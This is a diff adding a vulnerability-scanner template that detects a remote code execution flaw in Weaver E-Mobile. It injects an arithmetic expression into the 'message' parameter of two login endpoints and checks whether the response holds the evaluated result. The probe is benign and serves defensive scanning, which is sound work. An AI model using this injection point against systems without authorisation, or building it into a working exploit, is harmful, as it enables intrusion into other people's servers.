@@ -1,0 +1,44 @@
+id: weaver-e-mobile-rce-cnvd-2017-03561
+info:
+  name: Weaver E-Mobile RCE CNVD-2017-03561
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Detects remote code execution vulnerability in Weaver E-mobile systems.
+  reference:
+    - https://vul.wangan.com/a/CNVD-2017-03561
+
+variables:
+  r1: '{{rand_int(40000, 44800)}}'
+  r2: '{{rand_int(40000, 44800)}}'
+
+http:
+  - id: check-login-path
+    method: GET
+    path:
+      - '{{BaseURL}}/login.do?message={{r1}}*{{r2}}'
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{{to_number(r1)*to_number(r2)}}'
+          - "Weaver E-mobile"
+
+  - id: check-manager-login-path
+    method: GET
+    path:
+      - '{{BaseURL}}/manager/login.do?message={{r1}}*{{r2}}'
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{{to_number(r1)*to_number(r2)}}'
+          - "Weaver E-mobile"
